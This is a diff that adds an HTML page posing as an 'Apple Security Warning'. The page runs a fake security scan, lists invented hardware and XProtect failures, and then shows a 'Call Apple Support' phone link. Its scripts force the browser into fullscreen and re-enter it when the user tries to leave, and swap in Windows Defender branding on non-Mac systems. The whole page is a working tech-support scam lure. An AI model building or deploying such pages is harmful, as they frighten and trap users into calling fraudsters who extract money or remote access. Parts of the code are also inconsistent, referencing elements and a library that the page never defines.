@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠ Apple Security Warning ⚠</title>
+    <style>
+        :root {
+            --apple-blue: #007AFF;
+            --apple-red: #FF3B30;
+            --apple-gray: #F5F5F7;
+            --apple-dark: #1D1D1F;
+            --apple-green: #34C759;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
+            background: linear-gradient(white, var(--apple-blue));
+            color: var(--apple-dark);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex-direction: column;
+        }
+
+        /* Apple Logo */
+        .apple-logo {
+            width: 80px;
+            height: 80px;
+            background-image: url("apple-logo-blue.png"); /* Replace with Apple logo */
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin-bottom: 20px;
+        }
+
+        /* Security Container */
+        .security-container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 90%;
+        }
+
+        h1 {
+            font-size: 20px;
+            color: var(--apple-red);
+        }
+
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        /* Scan Button */
+        .scan-button {
+            background: var(--apple-red);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .scan-button:hover {
+            background: darkred;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            background: var(--apple-gray);
+            height: 8px;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0;
+            background: var(--apple-green);
+            transition: width 0.5s ease;
+        }
+
+        /* Error Message */
+        .error-message {
+            display: none;
+            font-size: 14px;
+            color: var(--apple-red);
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        /* Call Support Button */
+        .call-support {
+            display: none;
+            background: var(--apple-blue);
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- Apple Logo -->
+    <div class="apple-logo"></div>
+
+    <!-- Security Container -->
+    <div class="security-container">
+        <h1>⚠️ Apple Security Warning ⚠️</h1>
+        <p>Your device might be at risk. Run a quick security check.</p>
+        <p>Apple Security Intelligence Report:</strong>
+                    <p>• T2 Security Chip: Integrity Violation<br>
+                    • Secure Enclave: Cryptographic Failure<br>
+                    • XProtect: Signature Database Corrupted<br>
+                    • AMFI: Code Signature Validation Failed<br>
+                    • Neural Engine: Anomaly Detected</p>    
+        <!-- Scan Now Button -->
+        <button class="scan-button" id="startScan">Scan Now</button>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <!-- Error Message -->
+        <p class="error-message" id="errorMessage">
+            ERROR CODE: <strong>0x000A9F</strong> - Security Threat Detected
+        </p>
+
+        <!-- Call Support Button -->
+        <a href="tel:+18001234567" class="call-support" id="callSupport">📞 Call Apple Support</a>
+    </div>
+
+    <script>
+        function startScan() {
+            document.getElementById("startScan").style.display = "none";
+            document.getElementById("progressBar").style.display = "block";
+
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                document.getElementById("progressFill").style.width = `${progress}%`;
+
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    document.getElementById("errorMessage").style.display = "block";
+                    document.getElementById("callSupport").style.display = "inline-block";
+                }
+            }, 700);
+        }
+
+        document.getElementById("startScan").addEventListener("click", startScan);
+    </script>
+	 <script>
+        function enterFullScreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+            }
+        }
+
+        function preventExitFullScreen() {
+            document.addEventListener("fullscreenchange", () => {
+                if (!document.fullscreenElement) {
+                    enterFullScreen();
+                }
+            });
+        }
+
+        function startScan() {
+            enterFullScreen();
+            preventExitFullScreen();
+
+            document.getElementById("startScan").style.display = "none";
+            document.getElementById("progressBar").style.display = "block";
+
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                document.getElementById("progressFill").style.width = `${progress}%`;
+                document.getElementById("scanStatus").textContent = `Scanning system files... ${progress}% complete`;
+
+                if (progress >= 90) {
+                    clearInterval(scanInterval);
+                    document.getElementById("errorMessage").style.display = "block";
+                    document.getElementById("progressFill").style.background = "#ff0000";
+                    document.getElementById("scanStatus").textContent = "System Threat Detected!";
+                    document.getElementById("callSupport").style.display = "inline-block";
+                    document.getElementById("qrCode").style.display = "block";
+                }
+            }, 800);
+        }
+
+        document.getElementById("startScan").addEventListener("click", startScan);
+    </script>
+	<script>
+        // Configuration
+        let forceMacMode = false; // Set to true to force Mac version
+        
+        // Detect environment
+        const isMac = navigator.platform.toLowerCase().includes('mac');
+        const isWindows = navigator.platform.toLowerCase().includes('win');
+        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+        // Apply OS theme
+        function applyOSTheme() {
+            if (forceMacMode || isMac || isSafari) {
+                $('body').addClass('mac-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg');
+                $('#scan-title').text('macOS Security Alert');
+            } else {
+                $('body').addClass('windows-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg');
+                $('#scan-title').text('Windows Defender Alert');
+            }
+        }
+
+        // Fullscreen management
+        function enforceFullscreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            }
+        }
+
+        // Scan functionality
+        $('#start-scan').click(function() {
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                $('.progress-fill').css('width', `${progress}%`);
+                $('#scan-status').text(`Scanning system files... ${progress}% complete`);
+                
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    $('.emergency-number, .warning-message').fadeIn(500);
+                }
+            }, 800);
+        });
+
+        // Event listeners
+        $(document)
+            .on('click keydown', enforceFullscreen)
+            .on('fullscreenchange', enforceFullscreen);
+
+        // Initial setup
+        applyOSTheme();
+        enforceFullscreen();
+    </script>
+</body>
+</html>
